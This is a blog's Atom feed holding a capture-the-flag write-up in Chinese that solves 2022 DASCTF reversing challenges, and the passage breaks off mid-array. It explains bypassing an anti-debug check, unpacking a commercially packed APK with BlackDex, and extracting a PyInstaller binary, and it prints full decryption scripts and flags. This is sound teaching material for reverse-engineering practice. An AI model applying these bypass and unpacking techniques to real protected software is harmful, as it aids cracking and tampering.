<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jun`s Blog</title>
  <icon>https://www.gravatar.com/avatar/8c76a8aac1474e2dc386f680172f34e7</icon>
  <subtitle>Welcome</subtitle>
  <link href="https://adam-01.github.io/atom.xml" rel="self"/>
  
  <link href="https://adam-01.github.io/"/>
  <updated>2022-04-30T18:20:59.842Z</updated>
  <id>https://adam-01.github.io/</id>
  
  <author>
    <name>Jun</name>
    <email>dj1614850528@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="https://adam-01.github.io/2022/05/01/2022DASCTF%20Apr%20X%20FATE%20%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>https://adam-01.github.io/2022/05/01/2022DASCTF%20Apr%20X%20FATE%20%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-04-30T16:00:00.000Z</published>
    <updated>2022-04-30T18:20:59.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CreakMe"><a href="#CreakMe" class="headerlink" title="CreakMe"></a>CreakMe</h1><p>32位MFC程序，根据错误跳窗<code>Wrong!!!</code>可以定位到关键函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4031E0</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+10h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size; <span class="comment">// [esp+18h] [ebp-230h]</span></span><br><span class="line">  <span class="keyword">size_t</span> pdwDataLen; <span class="comment">// [esp+20h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *Buf1; <span class="comment">// [esp+24h] [ebp-224h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v9; <span class="comment">// [esp+28h] [ebp-220h] BYREF</span></span><br><span class="line">  BYTE *v10; <span class="comment">// [esp+2Ch] [ebp-21Ch] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> dwDataLen; <span class="comment">// [esp+30h] [ebp-218h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> v12; <span class="comment">// [esp+34h] [ebp-214h] BYREF</span></span><br><span class="line">  DWORD v13; <span class="comment">// [esp+38h] [ebp-210h] BYREF</span></span><br><span class="line">  BYTE v14[<span class="number">260</span>]; <span class="comment">// [esp+3Ch] [ebp-20Ch] BYREF</span></span><br><span class="line">  BYTE pbData[<span class="number">260</span>]; <span class="comment">// [esp+140h] [ebp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CWnd::UpdateData(<span class="keyword">this</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(pbData, <span class="number">0</span>, <span class="keyword">sizeof</span>(pbData));</span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  Size = sub_403E70(<span class="keyword">this</span> + <span class="number">216</span>);</span><br><span class="line">  pdwDataLen = sub_403E70(<span class="keyword">this</span> + <span class="number">212</span>);</span><br><span class="line">  dwDataLen = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v1 = sub_402590(Size);   <span class="comment">//Size 为 flag 长度</span></span><br><span class="line">  memmove(pbData, v1, Size);</span><br><span class="line">  v2 = sub_402590(pdwDataLen);</span><br><span class="line">  memmove(v14, v2, pdwDataLen);    <span class="comment">//pdwDataLen为password长度</span></span><br><span class="line">  <span class="keyword">if</span> ( Size != <span class="number">8</span> &amp;&amp; pdwDataLen != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_403820(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  sub_403510(pbData, Size &gt;&gt; <span class="number">1</span>, <span class="number">0x8003</span>u, &amp;Buf1, &amp;dwDataLen);<span class="comment">// md5</span></span><br><span class="line">  sub_403510(&amp;pbData[<span class="number">4</span>], Size &gt;&gt; <span class="number">1</span>, <span class="number">0x8004</span>u, &amp;v9, &amp;v12);<span class="comment">// sha1</span></span><br><span class="line">  sub_403510(pbData, Size, <span class="number">0x8003</span>u, &amp;v10, &amp;v13);<span class="comment">// md5</span></span><br><span class="line">  v4 = <span class="built_in">memcmp</span>(Buf1, (<span class="keyword">this</span> + <span class="number">220</span>), dwDataLen);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v9, (<span class="keyword">this</span> + <span class="number">480</span>), v12) )</span><br><span class="line">    <span class="keyword">return</span> sub_403820(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  sub_4036E0(v10, v13, v14, &amp;pdwDataLen, <span class="number">0x104</span>u);<span class="comment">// aes-128</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v14, (<span class="keyword">this</span> + <span class="number">740</span>), pdwDataLen) )</span><br><span class="line">    <span class="keyword">return</span> sub_403840(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_403820(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>flag</code>的长度为8，<code>password</code>长度为32。</p><p><code>sub_403510</code>是调用<code>wincrypt.h</code>的<code>API</code>操作，查询文档<a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id</a>   </p><p><code>ALG_ID</code>为<code>0x8003</code>表示<code>md5</code>，<code>0x8004</code>表示<code>sha1</code>，<code>0x660e</code>表示<code>aes-128</code>。</p><p>最后有三个<code>memcmp</code>比较，通过即可。</p><p>这里需要注意的是，有反调试，根据<code>ctf-wiki</code>里反调试中<a href="https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/，">https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/，</a> 找到了<code>ZwSetInformationThread</code>，这个函数可以禁止线程产生调试事件，<code>wiki</code>里提到只需要把第二个参数修改为除<code>0x11</code>以外的值即可。</p><p>所以在上面三个<code>memcmp</code>处下断点，分别将<code>(this + 220),(this + 480), (this + 740)</code>这三个值<code>dump</code>出来，然后到<code>cmd5</code>上解密。</p><p><code>(this + 220)：9F77C2A4AC5C0A671321BBE1E9972AF6</code> ==&gt; <code>NocT</code></p><p><img src="https://s3.bmp.ovh/imgs/2022/05/01/ea7653e39df85e38.png" alt=""></p><p><code>(this + 480)：D59F8E94B0E1DE6E329518A0C444AA94DE7C8D44</code> ==&gt; <code>uRne</code></p><p><img src="https://s3.bmp.ovh/imgs/2022/05/01/bc1a7fe336f85e05.png" alt=""></p><p><code>(this + 740)：5B9CEEB23BB7D734F31B7514C6B21FE8DE334474751B476AD4375188FC67E660DA0D5807814353EA7B52856C8665AFB4</code> </p><p><img src="https://s3.bmp.ovh/imgs/2022/05/01/e2bc44de431d6b46.png" alt=""></p><p>照着<code>sub_4036E0</code>写<code>aes</code>解密即可。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HCRYPTKEY phKey; <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [esp+10h] [ebp-Ch] BYREF</span></span><br><span class="line">  HCRYPTHASH phHash; <span class="comment">// [esp+14h] [ebp-8h] BYREF</span></span><br><span class="line">  BOOL retValue;</span><br><span class="line"></span><br><span class="line">  BYTE passwd_c[<span class="number">48</span>] = &#123; <span class="number">0x5B</span>, <span class="number">0x9C</span>, <span class="number">0xEE</span>, <span class="number">0xB2</span>, <span class="number">0x3B</span>, <span class="number">0xB7</span>, <span class="number">0xD7</span>, <span class="number">0x34</span>, <span class="number">0xF3</span>, <span class="number">0x1B</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0xC6</span>, <span class="number">0xB2</span>, <span class="number">0x1F</span>, <span class="number">0xE8</span>, <span class="number">0xDE</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x1B</span>, <span class="number">0x47</span>, <span class="number">0x6A</span>, <span class="number">0xD4</span>, <span class="number">0x37</span>, <span class="number">0x51</span>, <span class="number">0x88</span>, <span class="number">0xFC</span>, <span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x60</span>, <span class="number">0xDA</span>, <span class="number">0x0D</span>, <span class="number">0x58</span>, <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0xEA</span>, <span class="number">0x7B</span>, <span class="number">0x52</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0x86</span>, <span class="number">0x65</span>, <span class="number">0xAF</span>, <span class="number">0xB4</span> &#125;;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// &quot;NocTuRne&quot; md5</span></span><br><span class="line">  BYTE flag_md5[] = &#123; <span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0xa4</span>,<span class="number">0xa4</span>,<span class="number">0x1d</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x7a</span>,<span class="number">0x9f</span>,<span class="number">0xa1</span>,<span class="number">0xe9</span>,<span class="number">0xc2</span>,<span class="number">0x6c</span>,<span class="number">0xa5</span>,<span class="number">0x90</span>,<span class="number">0x90</span> &#125;;   </span><br><span class="line">  DWORD dwDataLen = <span class="number">0x10</span>;</span><br><span class="line">  DWORD dwBufLen = <span class="number">0x104</span>;</span><br><span class="line">  DWORD dwDataLen2;</span><br><span class="line">  DWORD* pdwDataLen = &amp;dwDataLen2;</span><br><span class="line">  *pdwDataLen = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">  phProv = <span class="number">0</span>;</span><br><span class="line">  phHash = <span class="number">0</span>;</span><br><span class="line">  phKey = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x18</span>u, <span class="number">0xF0000000</span>);</span><br><span class="line">  CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash);</span><br><span class="line">  CryptHashData(phHash, flag_md5, dwDataLen, <span class="number">0</span>);</span><br><span class="line">  CryptDeriveKey(phProv, <span class="number">0x660E</span>u, phHash, <span class="number">1u</span>, &amp;phKey);</span><br><span class="line">  CryptDecrypt(phKey, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, passwd_c, pdwDataLen);</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,passwd_c[i]);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( phKey )</span><br><span class="line">    CryptDestroyKey(phKey);</span><br><span class="line">  <span class="keyword">if</span> ( phHash )</span><br><span class="line">    CryptDestroyHash(phHash);</span><br><span class="line">  <span class="keyword">if</span> ( phProv )</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DASCTF&#123;H@sh_a^d_Aes_6y_W1nCrypt&#125;</span></span><br></pre></td></tr></table></figure><p><strong>flag</strong>:DASCTF{H@sh_a^d_Aes_6y_W1nCrypt}</p><h1 id="fakePica"><a href="#fakePica" class="headerlink" title="fakePica"></a>fakePica</h1><p><code>apkscan</code>查壳为梆梆免费版加固。</p><p><img src="https://s3.bmp.ovh/imgs/2022/05/01/e0a26c1e25323b92.png" alt=""></p><p>脱壳教程参考<a href="https://www.bilibili.com/video/BV1Bv411H7Qo/">https://www.bilibili.com/video/BV1Bv411H7Qo/</a></p><p>下载了<code>MT</code>管理器和<code>BlackDex32_3.1.0</code>脱壳，可以在这里下载：<a href="https://pan.baidu.com/s/1pH-tvWZnTz6BODdMIHsx6A?pwd=wxs1">https://pan.baidu.com/s/1pH-tvWZnTz6BODdMIHsx6A?pwd=wxs1</a><br>提取码：wxs1</p><p>跟着视频用<code>AS</code>的模拟器做的，环境给搞崩了，后面用<code>mumu</code>模拟器做的，后面发现也不用去删除修改<code>xml</code>和<code>dex</code>，直接使用<code>BlackDex</code>脱壳后，找到脱壳后的文件，<code>/storage/emulated/0/Android/data/top.niunaijun.blackdexa32/dump/com.ppsuc.ppsucctf/</code>，然后将主要逻辑的<code>dex</code>提取出来就可以使用<code>jadx</code>分析了， 并且没有<code>native</code>层代码。</p><p><code>adb提取文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /storage/emulated/0/Android/data/top.niunaijun.blackdexa32/dump/com.ppsuc.ppsucctf/cookie_8836564.dex  F:\Desktop</span><br></pre></td></tr></table></figure><p><code>jadx</code>分析，主要逻辑是<code>AES/CBC/NoPadding</code>加密，<code>iv:0102030405060708</code>, <code>key:picapicapicapica</code>,</p><p><code>mail</code>密文:<code>&#123;-114, 95, -37, ByteCompanionObject.MAX_VALUE, -110, 113, 41, 74, 40, 73, 19, 124, -57, -88, 39, -116, -16, -75, -3, -45, -73, -6, -104, -6, -78, 121, 110, 74, -90, -47, -28, -28&#125;;</code></p><p><code>passwd</code>密文：<code>&#123;-40, 26, 95, -49, -40, -123, 72, -90, -100, -41, 122, -4, 25, -101, -58, 116&#125;</code></p><p>在线解密或者脚本都可以</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span>(<span class="params">key=<span class="literal">None</span>, data=<span class="literal">None</span>, vi=<span class="literal">None</span>, nopadding=<span class="literal">False</span></span>):</span></span><br><span class="line">    <span class="comment"># 将加密数据转换位bytes类型数据</span></span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">&#x27;utf8&#x27;</span>), AES.MODE_CBC, vi.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="comment">#  # 将加密数据转换位bytes类型数据fromhex</span></span><br><span class="line">    text_decrypted = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(data.lower()))</span><br><span class="line">    <span class="comment"># 解密-bytesToString 字节转字符串</span></span><br><span class="line">    <span class="built_in">print</span>(text_decrypted)</span><br><span class="line">    str_text_decrypted = <span class="built_in">bytes</span>.decode(text_decrypted, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> nopadding:</span><br><span class="line">        <span class="keyword">return</span> str_text_decrypted.rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        consult = [<span class="string">&quot;\x00&quot;</span>,<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>]</span><br><span class="line">        <span class="comment"># 截取最后一位标记- # 字符串补位--最后一位就是位数 需要补充多少位的数据</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 获取最后一个位数的</span></span><br><span class="line">        mark_str_index = str_text_decrypted[-<span class="number">1</span>:]</span><br><span class="line">        num = consult.index(mark_str_index)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> str_text_decrypted[:-num]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    content0 = [-<span class="number">114</span>, <span class="number">95</span>, -<span class="number">37</span>, <span class="number">127</span>, -<span class="number">110</span>, <span class="number">113</span>, <span class="number">41</span>, <span class="number">74</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">124</span>, -<span class="number">57</span>, -<span class="number">88</span>, <span class="number">39</span>, -<span class="number">116</span>, -<span class="number">16</span>, -<span class="number">75</span>, -<span class="number">3</span>, -<span class="number">45</span>, -<span class="number">73</span>, -<span class="number">6</span>, -<span class="number">104</span>, -<span class="number">6</span>, -<span class="number">78</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">74</span>, -<span class="number">90</span>, -<span class="number">47</span>, -<span class="number">28</span>, -<span class="number">28</span>]</span><br><span class="line">    content1 = [-<span class="number">40</span>, <span class="number">26</span>, <span class="number">95</span>, -<span class="number">49</span>, -<span class="number">40</span>, -<span class="number">123</span>, <span class="number">72</span>, -<span class="number">90</span>, -<span class="number">100</span>, -<span class="number">41</span>, <span class="number">122</span>, -<span class="number">4</span>, <span class="number">25</span>, -<span class="number">101</span>, -<span class="number">58</span>, <span class="number">116</span>]</span><br><span class="line">    c0 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content0:</span><br><span class="line">        c0+=<span class="built_in">hex</span>(i&amp;<span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line">    c1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content1:</span><br><span class="line">        c1+=<span class="built_in">hex</span>(i&amp;<span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line">    <span class="built_in">print</span>(c1,c0)</span><br><span class="line">    email = aes_decrypt(key=<span class="string">&#x27;picapicapicapica&#x27;</span>, data=c0, vi=<span class="string">&#x27;0102030405060708&#x27;</span>)</span><br><span class="line">    passwd = aes_decrypt(key=<span class="string">&#x27;picapicapicapica&#x27;</span>, data=c1, vi=<span class="string">&#x27;0102030405060708&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(bytesToString(kkk))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + email+<span class="string">&#x27;+&#x27;</span>+passwd+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;picacomic@gmail.com+picacomic&#125;</span></span><br></pre></td></tr></table></figure><p><strong>flag</strong>：<code>flag&#123;picacomic@gmail.com+picacomic&#125;</code></p><h1 id="奇怪的交易"><a href="#奇怪的交易" class="headerlink" title="奇怪的交易"></a>奇怪的交易</h1><p><code>upx3.96</code>的壳，去壳之后发现是<code>python</code>打包的<code>elf</code>，所以使用<code>pyinstxtractor</code>解压得到<code>pyc</code>文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py ./奇怪的文件</span><br></pre></td></tr></table></figure><p>解压文件中发现<code>tinyaes.cpython-310-x86_64-linux-gnu.so</code>，所以可以确定<code>python</code>版本为<code>python3.10</code>，我这里是使用<code>python3.6</code>解压的文件，所以可能解压不完全，安装了一个<code>python3.10</code>后再次使用<code>pyinstxtractor</code>解压。</p><p><code>pyc</code>反编译使用<code>uncompyle6</code>和<code>pycdc</code>都报错，在线网站：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a> 反编译后有问题，所以使用<code>pycdas</code>转字节码后手撸出源码，</p><p>根据字节码的文档：<a href="https://docs.python.org/zh-cn/3/library/dis.html，">https://docs.python.org/zh-cn/3/library/dis.html，</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cup <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;请输入flag&#x27;</span>)</span><br><span class="line">pub_key = [<span class="number">12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893</span> , <span class="number">12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435</span>]</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">str</span>(<span class="built_in">pow</span>(m, pub_key[<span class="number">1</span>], pub_key[<span class="number">0</span>]))</span><br><span class="line">s = []</span><br><span class="line">cipher = [<span class="number">3532577106</span>, <span class="number">1472742623</span>, <span class="number">3642468664</span>, <span class="number">4193500461</span>, <span class="number">2398676029</span>, <span class="number">617653972</span>, <span class="number">1474514999</span>, <span class="number">1471783658</span>, <span class="number">1012864704</span>, <span class="number">3615627536</span>, <span class="number">993855884</span>, <span class="number">438456717</span>, <span class="number">3358938551</span>, <span class="number">3906991208</span>, <span class="number">198959101</span>, <span class="number">3317190635</span>, <span class="number">3656923078</span>, <span class="number">613157871</span>, <span class="number">2398768861</span>, <span class="number">97286225</span>, <span class="number">2336972940</span>, <span class="number">1471645170</span>, <span class="number">3233163154</span>, <span class="number">583597118</span>, <span class="number">2863776301</span>, <span class="number">3183067750</span>, <span class="number">1384330715</span>, <span class="number">2929694742</span>, <span class="number">3522431804</span>, <span class="number">2181488067</span>, <span class="number">3303062236</span>, <span class="number">3825712422</span>, <span class="number">145643141</span>, <span class="number">2148976293</span>, <span class="number">2940910035</span>, <span class="number">506798154</span>, <span class="number">994590281</span>, <span class="number">2231904779</span>, <span class="number">3389770074</span>, <span class="number">2814269052</span>, <span class="number">1105937096</span>, <span class="number">1789727804</span>, <span class="number">3757028753</span>, <span class="number">2469686072</span>, <span class="number">1162286478</span>, <span class="number">680814033</span>, <span class="number">2934024098</span>, <span class="number">2162521262</span>, <span class="number">4048876895</span>, <span class="number">2121620700</span>, <span class="number">4240287315</span>, <span class="number">2391811140</span>, <span class="number">3396611602</span>, <span class="number">3091349617</span>, <span class="number">3031523010</span>, <span class="number">2486958601</span>, <span class="number">3164065171</span>, <span class="number">1285603712</span>, <span class="number">798920280</span>, <span class="number">2337813135</span>, <span class="number">4186055520</span>, <span class="number">3523024366</span>, <span class="number">1077514121</span>, <span class="number">1436444106</span>, <span class="number">2731983230</span>, <span class="number">1507202797</span>, <span class="number">500756149</span>, <span class="number">198754565</span>, <span class="number">2382448647</span>, <span class="number">880454148</span>, <span class="number">1970517398</span>, <span class="number">3217485349</span>, <span class="number">1161840191</span>, <span class="number">560498076</span>, <span class="number">1782600856</span>, <span class="number">2643721918</span>, <span class="number">1285196205</span>, <span class="number">788797746</span>, <span class="number">1195724574</span>, <span class="number">4061612551</span>, <span class="number">103427523</span>, <span class="number">2502688387</span>, <span class="number">4147162188</span>, <span class="number">617564657</span>, <span class="number">978211984</span>, <span class="number">1781482121</span>, <span class="number">2205798970</span>, <span class="number">3939973102</span>, <span class="number">3826603515</span>, <span class="number">659557668</span>, <span class="number">2582884932</span>, <span class="number">1561884856</span>, <span class="number">2217488804</span>, <span class="number">1189296962</span>, <span class="number">169145316</span>, <span class="number">2781742156</span>, <span class="number">1323893433</span>, <span class="number">824667876</span>, <span class="number">408202876</span>, <span class="number">3759637634</span>, <span class="number">4094868412</span>, <span class="number">1508996065</span>, <span class="number">162419237</span>, <span class="number">3732146944</span>, <span class="number">3083560189</span>, <span class="number">3955940127</span>, <span class="number">2393776934</span>, <span class="number">2470191468</span>, <span class="number">3620861513</span>, <span class="number">481927014</span>, <span class="number">2756226070</span>, <span class="number">3154651143</span>, <span class="number">1261069441</span>, <span class="number">2063238535</span>, <span class="number">2222237213</span>, <span class="number">101459755</span>, <span class="number">3159774417</span>, <span class="number">1721190841</span>, <span class="number">1078395785</span>, <span class="number">176506553</span>, <span class="number">3552913423</span>, <span class="number">1566142515</span>, <span class="number">1938949000</span>, <span class="number">1499289517</span>, <span class="number">3315102456</span>, <span class="number">829714860</span>, <span class="number">3843359394</span>, <span class="number">952932374</span>, <span 